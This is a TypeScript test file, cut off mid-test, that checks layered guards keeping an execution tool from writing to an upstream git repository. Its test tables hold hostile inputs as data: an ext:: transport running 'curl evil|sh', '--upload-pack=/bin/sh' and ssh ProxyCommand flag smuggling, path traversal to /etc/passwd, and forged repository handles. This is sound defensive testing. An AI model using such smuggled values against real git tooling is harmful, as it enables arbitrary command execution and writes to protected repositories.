import { execFile } from 'node:child_process';
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { loadEnv } from '../../src/env.js';
import { executionUpstream } from '../../src/execution/configure.js';
import {
  ADD_WORKTREE_NOT_AUTHENTIC_REFUSAL,
  ARTIFACT_REPO_AT_UPSTREAM_REFUSAL,
  ARTIFACT_REPO_NOT_AUTHENTIC_REFUSAL,
  type ArtifactRepo,
  addWorktree,
  commitWorktree,
  createArtifactRepo,
  createScratchRepo,
  disposeScratchRepo,
  mainCommit,
  PIN_ARTIFACT_NOT_AUTHENTIC_REFUSAL,
  PUSH_INTO_UPSTREAM_REFUSAL,
  pinSettledArtifact,
  pushArtifactBranch,
  removeWorktree,
  SCRATCH_REPO_AT_UPSTREAM_REFUSAL,
  type ScratchRepo,
  UPSTREAM_ARTIFACT_REMOTE_REFUSAL,
  WORKTREE_CHECKOUT_NOT_AUTHENTIC_REFUSAL,
  type WorktreeCheckout,
} from '../../src/execution/git.js';
import { createDeterministicShimProvider } from '../../src/execution/shim.js';
import {
  isAcceptableUpstreamUrl,
  pathsOverlap,
  UPSTREAM_REF_REFUSAL,
  UPSTREAM_UNPARSEABLE_URL_REFUSAL,
  UPSTREAM_URL_REFUSAL,
  upstreamLocalPath,
} from '../../src/execution/upstream.js';
import {
  createWorktreeCommandProvider,
  SCRATCH_REPO_NOT_AUTHENTIC_REFUSAL,
  WORKTREE_UPSTREAM_SEED_REFUSAL,
} from '../../src/execution/worktree-provider.js';

/**
 * REAL-REPO EXECUTION MODE (#141) — the guard witnesses.
 *
 * The headline invariant is ONE sentence — THE UPSTREAM IS NEVER WRITTEN — and
 * it is enforced at three layers, because a guard present on one layer and
 * absent on the adjacent one is the #89 adjacent-path-bypass class:
 *
 *   config    `env.ts`               → the dangerous wiring will not BOOT
 *   plumbing  `git.ts`/`upstream.ts` → the dangerous OPERATION refuses
 *   provider  `shim`/`worktree`      → the dangerous PROVIDER will not BUILD
 *
 * ## Why the disjointness table exists
 *
 * The campaign's recurring defect is not a missing guard, it is a SHARED
 * REFUSAL SENTENCE: two guards throw messages that both satisfy one witness's
 * regex, so the witness passes with guard B reverted because guard A caught the
 * fixture instead. It has fired four times. So every refusal in this seam gets
 * its own sentence, and `GUARDS` below is checked two ways — pairwise disjoint
 * as strings, and each fixture's thrown message matches EXACTLY ONE probe.
 * Revert any single guard and its case reds on "expected a throw", never on
 * somebody else's message.
 */

const run = promisify(execFile);

/** A real git repo with a known file — the stand-in for "this repo". */
async function makeUpstream(file = 'KEEP.txt', body = 'the file a session deletes\n') {
  const dir = await mkdtemp(join(tmpdir(), 'atrium-upstream-'));
  await run('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  await writeFile(join(dir, file), body);
  await writeFile(join(dir, 'untouched.txt'), 'stays exactly as it is\n');
  await run('git', ['add', '-A'], { cwd: dir });
  await run(
    'git',
    ['-c', 'user.name=up', '-c', 'user.email=up@up', 'commit', '-q', '-m', 'upstream seed'],
    { cwd: dir },
  );
  const { stdout } = await run('git', ['rev-parse', 'HEAD'], { cwd: dir });
  return { dir, commit: stdout.trim(), file };
}

/**
 * A content hash of every file under `dir` — the byte-identity measure the
 * invariant is stated in. Paths AND contents, sorted, so a new file, a deleted
 * file, or a changed byte all move it.
 */
async function fingerprint(dir: string): Promise<string> {
  const { stdout } = await run('bash', [
    '-c',
    `cd ${JSON.stringify(dir)} && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | sha256sum`,
  ]);
  return stdout.trim();
}

/* ═══════════════════════════════════════════════════════════════════════════
 * THE DISJOINTNESS TABLE — one row per guard, one probe per row.
 * ═══════════════════════════════════════════════════════════════════════════ */

interface Guard {
  readonly id: string;
  readonly layer: 'config' | 'plumbing' | 'provider';
  /** A fragment that appears in THIS guard's refusal and no other's. */
  readonly probe: RegExp;
}

const GUARDS: readonly Guard[] = [
  { id: 'config/url-missing', layer: 'config', probe: /reads as live and does nothing/ },
  { id: 'config/ref-missing', layer: 'config', probe: /will not guess which commit/ },
  { id: 'config/wrong-provider', layer: 'config', probe: /would be silently inert/ },
  { id: 'config/url-shape', layer: 'config', probe: /is not a repository and is refused/ },
  {
    id: 'config/write-overlap',
    layer: 'config',
    probe: /refused at boot rather than discovered afterwards/,
  },
  {
    id: 'plumbing/ref-shape',
    layer: 'plumbing',
    probe: /not a well-formed, option-free git ref name/,
  },
  {
    id: 'plumbing/url-as-option',
    layer: 'plumbing',
    probe: /resolve as a flag, an ext:: transport/,
  },
  {
    id: 'plumbing/artifact-repo-at-upstream',
    layer: 'plumbing',
    probe: /would modify the very repository a session forks from/,
  },
  {
    id: 'plumbing/push-into-upstream',
    layer: 'plumbing',
    probe: /a human FETCHES from the provider-owned repo/,
  },
  {
    id: 'provider/artifact-remote',
    layer: 'provider',
    probe: /without a durable artifact remote distinct from the upstream/,
  },
  // ── Round 2 (#141 r2) ─────────────────────────────────────────────────────
  {
    // The honest boundary. Not a guard on a WRITE — a refusal of the whole MODE
    // on the one provider where the claim cannot be kept.
    id: 'config/unsandboxed-worktree',
    layer: 'config',
    probe: /real-repo mode is unavailable under the UNSANDBOXED worktree/,
  },
  {
    // One sentence, thrown by `upstreamLocalPath`, which binds at BOTH the
    // config layer (via `assertExecutionUpstreamSafe`) and the plumbing
    // (`createArtifactRepo`, `assertArtifactRemoteIsNotUpstream`). It is one
    // guard used twice, not two guards sharing a sentence — the trap the table
    // exists for is the opposite case.
    id: 'plumbing/unparseable-url',
    layer: 'plumbing',
    probe: /an unreadable location is not evidence that it is remote/,
  },
  // ── Round 3 (#141 r3) ─────────────────────────────────────────────────────
  {
    // FIX 2: the write-overlap check re-run AT OPERATION TIME inside
    // `createScratchRepo`, so a hand-built seed (or a symlink swapped in after
    // the boot gate) is caught at the moment of the write, not only at boot.
    id: 'plumbing/scratch-repo-at-upstream',
    layer: 'plumbing',
    probe: /the per-session worktrees forked here would be written inside/,
  },
  {
    // FIX 3: the worktree factory itself refuses a seeded upstream, so a direct
    // caller who never loaded an `Env` cannot bypass the boot refusal.
    id: 'provider/worktree-upstream-seed',
    layer: 'provider',
    probe: /a real harness here can rewrite its own push destination/,
  },
  // ── Round 5 (#141 r5): runtime-unforgeable provenance ─────────────────────
  {
    // F1: the worktree factory verifies the scratch repo's factory BRAND, so a
    // hand-built `{ dir, seedCommit }` that omits `upstream` (and so slips the
    // structural refusal) is rejected as not-a-factory-instance.
    id: 'provider/scratch-not-authentic',
    layer: 'provider',
    probe: /createScratchRepo did not mint/,
  },
  {
    // F2: `pushArtifactBranch` verifies the artifact repo's factory BRAND, so a
    // forged `{ dir, upstreamPath: null }` whose lying field would skip the overlap
    // check is rejected before that field is ever read.
    id: 'plumbing/artifact-not-authentic',
    layer: 'plumbing',
    probe: /createArtifactRepo did not mint/,
  },
  // ── Round 6 (#141 r6): the brand verified at the WRITE, not only at construction ─
  {
    // FINDING B: `addWorktree`'s `git worktree add` verifies the scratch brand, so a
    // forged handle aimed at the upstream cannot register a worktree inside it.
    id: 'plumbing/add-worktree-not-authentic',
    layer: 'plumbing',
    probe: /only a factory-branded scratch repo may host a worktree/,
  },
  {
    // FINDING B: `pinSettledArtifact`'s `git update-ref` verifies the artifact brand —
    // the SECOND durable-repo write, gated like the push round 5 already covered.
    id: 'plumbing/pin-artifact-not-authentic',
    layer: 'plumbing',
    probe: /only a factory-branded artifact repo may be pinned into/,
  },
  {
    // The "no OTHERS" closure: `commitWorktree`/`removeWorktree`/`pushArtifactBranch`
    // verify the WorktreeCheckout brand, so a hand-built checkout cannot point the
    // adapter's own commit/remove at the upstream via forged gitDir/dir/repoDir.
    id: 'plumbing/worktree-checkout-not-authentic',
    layer: 'plumbing',
    probe: /addWorktree did not mint/,
  },
];

/**
 * Assert a refusal is THIS guard's and nobody else's. The second half is the
 * anti-shared-sentence check: if another guard's message also matched, the
 * witness would be proving the wrong thing.
 */
function expectExactlyGuard(message: string, id: string): void {
  const matched = GUARDS.filter((guard) => guard.probe.test(message)).map((guard) => guard.id);
  expect(matched, `message did not match exactly one guard probe:\n${message}`).toEqual([id]);
}

describe('#141 refusal sentences are pairwise disjoint', () => {
  it("no guard probe matches another guard's shipped refusal string", () => {
    const shipped: Array<[string, string]> = [
      ['plumbing/ref-shape', UPSTREAM_REF_REFUSAL],
      ['plumbing/url-as-option', UPSTREAM_URL_REFUSAL],
      ['plumbing/artifact-repo-at-upstream', ARTIFACT_REPO_AT_UPSTREAM_REFUSAL],
      ['plumbing/push-into-upstream', PUSH_INTO_UPSTREAM_REFUSAL],
      ['provider/artifact-remote', UPSTREAM_ARTIFACT_REMOTE_REFUSAL],
      ['plumbing/unparseable-url', UPSTREAM_UNPARSEABLE_URL_REFUSAL],
      ['plumbing/scratch-repo-at-upstream', SCRATCH_REPO_AT_UPSTREAM_REFUSAL],
      ['provider/worktree-upstream-seed', WORKTREE_UPSTREAM_SEED_REFUSAL],
      ['provider/scratch-not-authentic', SCRATCH_REPO_NOT_AUTHENTIC_REFUSAL],
      ['plumbing/artifact-not-authentic', ARTIFACT_REPO_NOT_AUTHENTIC_REFUSAL],
      ['plumbing/add-worktree-not-authentic', ADD_WORKTREE_NOT_AUTHENTIC_REFUSAL],
      ['plumbing/pin-artifact-not-authentic', PIN_ARTIFACT_NOT_AUTHENTIC_REFUSAL],
      ['plumbing/worktree-checkout-not-authentic', WORKTREE_CHECKOUT_NOT_AUTHENTIC_REFUSAL],
    ];
    for (const [id, sentence] of shipped) expectExactlyGuard(sentence, id);
    // And no two shipped sentences are the same string, which is the trap in its
    // crudest form.
    const sentences = shipped.map(([, sentence]) => sentence);
    expect(new Set(sentences).size).toBe(sentences.length);
  });

  it('covers every layer the invariant is restated at', () => {
    expect(new Set(GUARDS.map((g) => g.layer))).toEqual(
      new Set(['config', 'plumbing', 'provider']),
    );
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 1 — CONFIG. The dangerous wiring does not boot.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — config layer (#141, red-on-revert)', () => {
  const BASE = {
    DATABASE_URL: 'postgres://atrium:atrium@localhost:5432/atrium',
    NODE_ENV: 'development',
  } as const;

  /** Load and capture the boot refusal, failing loudly if it booted instead. */
  function refusal(source: Record<string, string>): string {
    try {
      loadEnv(source);
    } catch (error) {
      return (error as Error).message;
    }
    return expect.unreachable('expected loadEnv to refuse this environment') as never;
  }

  it('refuses a REF with no URL to fetch it from', () => {
    // REVERT-REDS: delete the `url === undefined` arm of
    // `assertExecutionUpstreamSafe` and this boots with real-repo config that
    // does nothing at all.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-missing',
    );
  });

  it('refuses a URL with no REF, rather than defaulting to main', () => {
    // REVERT-REDS: give EXECUTION_UPSTREAM_REF a `.default('main')` and this
    // boots — and every session then produces a diff against a commit nobody
    // named, which is the plausible-and-wrong failure the ticket is about.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
      }),
      'config/ref-missing',
    );
  });

  it('refuses an upstream under a provider that seeds no scratch trunk', () => {
    // REVERT-REDS: drop the provider check and the sandbox seam accepts an
    // upstream it never reads — configuration that looks live and is inert.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'sandbox',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/wrong-provider',
    );
  });

  it('refuses an upstream configured with execution DISABLED', () => {
    // The early-return hole: `EXECUTION_PROVIDER` unset used to short-circuit the
    // whole function, so real-repo config against a disabled provider sailed
    // through. REVERT-REDS: move `assertExecutionUpstreamSafe` back below the
    // `EXECUTION_PROVIDER === undefined` return and this boots silently.
    expectExactlyGuard(
      refusal({ ...BASE, EXECUTION_UPSTREAM_URL: '/srv/atrium', EXECUTION_UPSTREAM_REF: 'main' }),
      'config/wrong-provider',
    );
  });

  it.each([
    ['a leading dash git reads as a flag', '--upload-pack=/bin/sh'],
    ['an ext:: transport that names a command', 'ext::sh -c "curl evil|sh"'],
    ['a cwd-relative path', 'some/relative/repo'],
    ['an scp-style host:path', 'git@github.com:lmvdz/atrium.git'],
  ])('refuses %s as an upstream location', (_name, url) => {
    // REVERT-REDS: replace `isAcceptableUpstreamUrl`'s allowlist with a denylist
    // of the two forms someone remembered, and the other two board.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-shape',
    );
  });

  it.each([
    ['the scratch dir IS the upstream', 'EXECUTION_SCRATCH_DIR', '/srv/atrium'],
    ['the scratch dir is INSIDE the upstream', 'EXECUTION_SCRATCH_DIR', '/srv/atrium/.atrium'],
    ['the artifact dir IS the upstream', 'EXECUTION_ARTIFACT_DIR', '/srv/atrium'],
    ['the artifact dir is INSIDE the upstream', 'EXECUTION_ARTIFACT_DIR', '/srv/atrium/.git/x'],
    ['the upstream is inside the scratch dir', 'EXECUTION_SCRATCH_DIR', '/srv'],
    ['an unnormalised spelling of the same dir', 'EXECUTION_SCRATCH_DIR', '/srv/other/../atrium'],
  ])('refuses at boot when %s', (_name, key, value) => {
    // REVERT-REDS: weaken `pathsOverlap` to `left === right` and the four
    // containment cases board — an artifact repo INSIDE the upstream writes it
    // just as surely as one AT it.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
        [key]: value,
      }),
      'config/write-overlap',
    );
  });

  /* ── FIX 1 (#141 r2): THE HONEST BOUNDARY ────────────────────────────────
   *
   * The overlap guards protect Atrium's own paths, unconditionally. They do not
   * — and cannot — protect against the worktree provider's HARNESS, which is
   * arbitrary local code that can write `url.<upstream>.pushInsteadOf` into the
   * worktree's git config and thereby redirect the adapter's own later push
   * into the upstream. The argv never changes, so no path check sees it. The
   * resolution is to scope the CLAIM, not to add a seventh guard that also
   * cannot see it: real-repo mode is refused on that provider outright.
   */
  const WORKTREE_BASE = {
    ...BASE,
    EXECUTION_PROVIDER: 'worktree',
    EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
    EXECUTION_ARTIFACT_DIR: '/tmp/atrium-artifacts-141',
    EXECUTION_HARNESS_COMMAND: '["bash","-lc","true"]',
    EXECUTION_ALLOW_UNSANDBOXED: '1',
  } as const;

  it('refuses real-repo mode under the UNSANDBOXED worktree provider, naming #138', () => {
    // REVERT-REDS: delete the `EXECUTION_PROVIDER === 'worktree'` arm of
    // `assertExecutionUpstreamSafe` and this boots — and then the documented
    // "the upstream is never written" is a claim the deployment cannot keep,
    // because its harness can rewrite the push destination out from under every
    // guard in this file.
    const message = refusal({
      ...WORKTREE_BASE,
      EXECUTION_UPSTREAM_URL: '/srv/atrium',
      EXECUTION_UPSTREAM_REF: 'main',
    });
    expectExactlyGuard(message, 'config/unsandboxed-worktree');
    // The refusal must name the unblock, or an operator reads it as "never".
    expect(message).toContain('#138');
    expect(message).toContain('EXECUTION_PROVIDER=shim');
  });

  it('leaves the worktree provider bootable with NO upstream — the flip', () => {
    // The boundary is on real-repo MODE, not on the provider. #120's unsandboxed
    // opt-in seam is untouched.
    expect(() => loadEnv({ ...WORKTREE_BASE })).not.toThrow();
  });

  it('leaves the shim provider bootable WITH an upstream — the other flip', () => {
    // The shim runs no harness command, so nothing can write a git config and
    // the claim holds there. Scoping is not banning.
    expect(() =>
      loadEnv({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
    ).not.toThrow();
  });

  /* ── FIX 2 (#141 r2): the overlap guards stop being purely lexical ───────── */

  it.each([
    ['an IPv4 loopback host', 'file://127.0.0.1/srv/atrium'],
    ['an IPv6 loopback host', 'file://[::1]/srv/atrium'],
    ['the localhost alias', 'file://localhost/srv/atrium'],
    ['no host at all', 'file:///srv/atrium'],
    ['a trailing slash', 'file:///srv/atrium/'],
    ['an uppercase scheme', 'FILE:///srv/atrium'],
    ['an unnormalised path', 'file:///srv/other/../atrium'],
    // ── FIX 1 (#141 r3): the non-loopback authorities git ALSO localises ──────
    // The campaign-stopper the round-2 fix introduced: it kept a "remote file://
    // host" category and left these classified as remote, so the overlap check
    // no-opped while git wrote under the upstream. git drops EVERY file:
    // authority — verified: `git fetch file://build-box.example.com/srv/atrium`
    // runs `git-upload-pack '/srv/atrium'`.
    ['a non-loopback hostname (the exact stopper)', 'file://build-box.example.com/srv/atrium'],
    ['a bare word host', 'file://hostname/srv/atrium'],
    [
      'an IPv4-mapped IPv6 host not in the old loopback set',
      'file://[::ffff:127.0.0.1]/srv/atrium',
    ],
  ])('sees the write overlap through a file:// URL with %s', (_name, url) => {
    // REVERT-REDS: restore `upstreamLocalPath`'s loopback-host allowlist (the
    // `host !== '' && !LOOPBACK_FILE_HOSTS.has(host)` return-null) and the
    // non-loopback rows BOOT — `upstreamLocalPath` reads them as "remote, no
    // overlap question" while git writes the scratch repo under the upstream.
    // The loopback rows red on the round-2 defect (the `catch { return null }`).
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/srv/atrium',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/write-overlap',
    );
  });

  it('catches the overlap through a file:// URL naming a DIFFERENT host — git drops the authority', () => {
    // FIX 1 (#141 r3), the corrected direction. The round-2 fix asserted this
    // very configuration BOOTS ("a non-loopback host is somebody else's
    // filesystem"). That was wrong: git ignores the `file:` authority and
    // localises the path, so `file://build-box.example.com/srv/atrium` IS the
    // local `/srv/atrium`, which IS the scratch dir. It must be REFUSED as an
    // overlap, not booted as remote. REVERT-REDS: restore the loopback allowlist
    // in `upstreamLocalPath` and this boots — the stopper, executed.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/srv/atrium',
        EXECUTION_UPSTREAM_URL: 'file://build-box.example.com/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/write-overlap',
    );
  });

  it('still boots a file:// upstream on a DIFFERENT host that does not overlap — the flip', () => {
    // Fail-closed is not fail-always: the host is irrelevant, but the PATH still
    // decides overlap. A non-loopback file:// URL whose localised path is nowhere
    // near the scratch/artifact dirs is a normal, bootable local upstream.
    expect(() =>
      loadEnv({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_ARTIFACT_DIR: '/tmp/atrium-artifacts-141',
        EXECUTION_UPSTREAM_URL: 'file://build-box.example.com/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
    ).not.toThrow();
  });

  it('refuses a file:// URL it cannot canonicalise instead of calling it remote', () => {
    // `%2F` is an ENCODED separator: node refuses to turn it into a path, git
    // decodes it. Two readers, two answers — so neither reading is trusted.
    // REVERT-REDS: return null instead of throwing and this boots with all four
    // overlap checks silently disabled.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: 'file:///srv/atrium%2F..%2Fetc',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'plumbing/unparseable-url',
    );
  });

  it('refuses a case-equivalent spelling of the upstream', () => {
    // On a case-insensitive filesystem these are ONE directory and the lexical
    // comparison sees two. REVERT-REDS: drop the case-folded arm of
    // `pathsOverlap` and this boots.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/srv/Atrium/scratch',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/write-overlap',
    );
  });

  it('refuses an artifact dir that is a SYMLINK into the upstream', async () => {
    // The lexical check compares two strings that genuinely do not overlap. The
    // filesystem disagrees, and `init --bare` follows the link.
    // REVERT-REDS: drop `canonicalize` from `pathsOverlap` and this boots, then
    // writes a bare repo inside the upstream on the very next start.
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-symlink-'));
    try {
      const upstreamDir = join(root, 'upstream');
      await mkdir(join(upstreamDir, 'nested'), { recursive: true });
      const link = join(root, 'artifacts');
      await symlink(join(upstreamDir, 'nested'), link, 'dir');
      expectExactlyGuard(
        refusal({
          ...BASE,
          EXECUTION_PROVIDER: 'shim',
          EXECUTION_SCRATCH_DIR: join(root, 'scratch'),
          EXECUTION_ARTIFACT_DIR: link,
          EXECUTION_UPSTREAM_URL: upstreamDir,
          EXECUTION_UPSTREAM_REF: 'main',
        }),
        'config/write-overlap',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('refuses a scratch dir whose not-yet-created path hangs off a symlinked parent', async () => {
    // The dir does not exist yet — the server is about to create it — which is
    // why `canonicalize` walks up to the deepest EXISTING component. A guard
    // that only dereferenced paths that already exist would never fire at boot.
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-symlink2-'));
    try {
      const upstreamDir = join(root, 'upstream');
      await mkdir(upstreamDir, { recursive: true });
      const link = join(root, 'link-to-upstream');
      await symlink(upstreamDir, link, 'dir');
      expectExactlyGuard(
        refusal({
          ...BASE,
          EXECUTION_PROVIDER: 'shim',
          EXECUTION_SCRATCH_DIR: join(link, 'not', 'created', 'yet'),
          EXECUTION_UPSTREAM_URL: upstreamDir,
          EXECUTION_UPSTREAM_REF: 'main',
        }),
        'config/write-overlap',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  /* ── FIX 3 (#141 r2): the URL allowlist is PARSED, not prefix-matched ───── */

  it.each([
    ['a hostless https URL', 'https://'],
    ['a flag smuggled through the ssh authority', 'ssh://-oProxyCommand=evil/repo'],
    ['a query string on a file path', 'file:///srv/atrium?upload-pack=/bin/sh'],
    ['a fragment on a file path', 'file:///srv/atrium#frag'],
    ['a bare file:// with no path', 'file://'],
    ['an authority-shaped nonsense host', 'git://=weird=/repo'],
  ])('refuses %s as an upstream location', (_name, url) => {
    // REVERT-REDS: restore `isAcceptableUpstreamUrl` to
    // `UPSTREAM_URL_SCHEMES.some(s => url.startsWith(s))` and every one of these
    // boards — `ssh://-oProxyCommand=…` most of all, which is a command git runs.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-shape',
    );
  });

  it.each([
    ['a plain absolute path', '/srv/atrium'],
    ['an https URL', 'https://github.com/lmvdz/atrium.git'],
    ['an UPPERCASE scheme, which git accepts', 'HTTPS://github.com/lmvdz/atrium.git'],
    ['an ssh URL with a user and a port', 'ssh://git@github.com:22/lmvdz/atrium.git'],
    ['a git:// URL', 'git://github.com/lmvdz/atrium.git'],
    ['an http URL', 'http://internal.example/atrium.git'],
    ['a file URL', 'file:///srv/other/atrium'],
  ])('accepts %s', (_name, url) => {
    // The regression half. `HTTPS://…` was wrongly REFUSED by the prefix check;
    // a parse-based allowlist must not trade one false answer for another.
    expect(() =>
      loadEnv({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
    ).not.toThrow();
  });

  it('accepts a well-formed, non-overlapping real-repo configuration', () => {
    const env = loadEnv({
      ...BASE,
      EXECUTION_PROVIDER: 'shim',
      EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
      EXECUTION_ARTIFACT_DIR: '/tmp/atrium-artifacts-141',
      EXECUTION_UPSTREAM_URL: '/srv/atrium',
      EXECUTION_UPSTREAM_REF: 'main',
    });
    expect(executionUpstream(env)).toEqual({ url: '/srv/atrium', ref: 'main' });
  });

  it('reads NO upstream when neither half is set — the unchanged #120 seam', () => {
    const env = loadEnv({
      ...BASE,
      EXECUTION_PROVIDER: 'shim',
      EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
    });
    expect(executionUpstream(env)).toBeUndefined();
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 2 — PLUMBING. The dangerous operation refuses.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — git plumbing (#141, red-on-revert)', () => {
  let upstream: Awaited<ReturnType<typeof makeUpstream>>;
  const trash: string[] = [];

  beforeEach(async () => {
    upstream = await makeUpstream();
    trash.push(upstream.dir);
  });
  afterEach(async () => {
    while (trash.length > 0) {
      const dir = trash.pop();
      if (dir) await rm(dir, { recursive: true, force: true });
    }
  });

  it.each([
    ['an option', '--upload-pack=/bin/sh'],
    ['a refspec that writes a second local ref', 'main:refs/heads/evil'],
    ['a path traversal', 'refs/../../etc/passwd'],
    ['a whitespace-carrying value', 'main branch'],
    ['a .lock suffix git itself rejects', 'main.lock'],
  ])('refuses a seed whose ref is %s', async (_name, ref) => {
    // The seed is validated on the ONLY path that fetches, so a hand-built seed
    // gets the operator's refusal. REVERT-REDS: drop `assertUpstreamSeed` from
    // `createScratchRepo` and `--upload-pack=` reaches git's argv.
    const error = await createScratchRepo(undefined, { url: upstream.dir, ref }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error, `expected createScratchRepo to refuse ref ${ref}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/ref-shape');
  });

  it.each([
    ['a flag', '--upload-pack=/bin/sh'],
    ['an ext:: transport', 'ext::sh -c evil'],
    ['a relative path', 'relative/repo'],
  ])('refuses a seed whose location is %s', async (_name, url) => {
    // REVERT-REDS: remove the url arm of `assertUpstreamSeed` and the `--`
    // separator is the only thing left; drop that too and `--upload-pack` runs.
    const error = await createScratchRepo(undefined, { url, ref: 'main' }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error, `expected createScratchRepo to refuse url ${url}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/url-as-option');
  });

  it.each([
    ['AT the upstream', (dir: string) => dir],
    ['INSIDE the upstream', (dir: string) => join(dir, '.git', 'atrium-artifacts')],
    ['a parent OF the upstream', (dir: string) => join(dir, '..')],
  ])('refuses to open the durable artifact repo %s', async (_name, where) => {
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: drop the overlap check from `createArtifactRepo` and this
    // runs `init --bare` + two `config` writes against a real repository — a
    // BOOT-time write, before any session exists.
    const error = await createArtifactRepo(where(upstream.dir), {
      url: upstream.dir,
      ref: 'main',
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/artifact-repo-at-upstream');
    // Nothing was written on the way to refusing.
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('F2 (#141 r5): refuses to push through a FORGED ArtifactRepo whose upstreamPath lies', async () => {
    // The exact bypass BOTH foreign lineages executed. `ArtifactRepo` is a plain
    // object; a caller with the opt-in hand-builds one pointed AT the upstream that
    // declares `upstreamPath: null` — "no local upstream, nothing to overlap". Round
    // 4's mandatory field did not stop this: a required field can still LIE. The
    // `null` reads as "skip the overlap check" and the branch lands in the human's
    // repository. Round 5 refuses the handle FIRST, because it was not minted by
    // `createArtifactRepo` — before its lying field is ever read.
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);
    const checkout = await addWorktree(scratch, 'push-into-upstream');
    await writeFile(join(checkout.dir, 'session.txt'), 'work\n');
    await commitWorktree(checkout, 'session work');

    const before = await fingerprint(upstream.dir);
    // THE EXACT F2 FORGERY: a null provenance that would skip the overlap check.
    const forgedNull: ArtifactRepo = { dir: upstream.dir, upstreamPath: null };
    // And the sibling forgery that instead states its overlap truthfully — also a
    // hand-built handle, also refused by the brand rather than by the overlap check.
    const forgedTruthful: ArtifactRepo = { dir: upstream.dir, upstreamPath: upstream.dir };
    // REVERT-REDS: delete the `!isAuthenticArtifactRepo` gate from
    // `pushArtifactBranch` and `forgedNull` is ACCEPTED — its `null` skips the
    // overlap check and the push lands `refs/heads/atrium/session/push-into-upstream`
    // in the upstream, moving the fingerprint below.
    for (const forged of [forgedNull, forgedTruthful]) {
      const message = await pushArtifactBranch(checkout, forged).then(
        () => null,
        (e: Error) => e.message,
      );
      expect(message, 'expected pushArtifactBranch to refuse a forged handle').not.toBeNull();
      expectExactlyGuard(message as string, 'plumbing/artifact-not-authentic');
    }
    // Nothing was written into the upstream on the way to refusing either forgery.
